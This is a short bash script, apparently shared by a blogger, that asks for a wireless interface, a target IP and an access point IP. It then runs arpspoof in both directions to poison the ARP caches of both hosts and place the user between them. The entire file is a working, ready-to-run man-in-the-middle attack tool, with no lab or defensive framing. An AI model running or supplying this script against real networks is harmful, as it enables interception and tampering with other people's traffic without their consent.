#!/bin/bash

# ------------------------------
# Taufan Lubis
# www.taufanlubis.wordpress.com
#-------------------------------

echo "Arp spoofing"
echo "bashscript by Taufan"
echo ""
echo "Enter your wireless card name: "
read wirelesscard
echo "Enter your ip target: "
read iptarget
echo "Enter your ip access point: "
read ipap

xterm -hold -e "sudo arpspoof -i $wirelesscard -t $iptarget $ipap"
xterm -hold -e "sudo arpspoof -i $wirelesscard -t $ipap $iptarget"
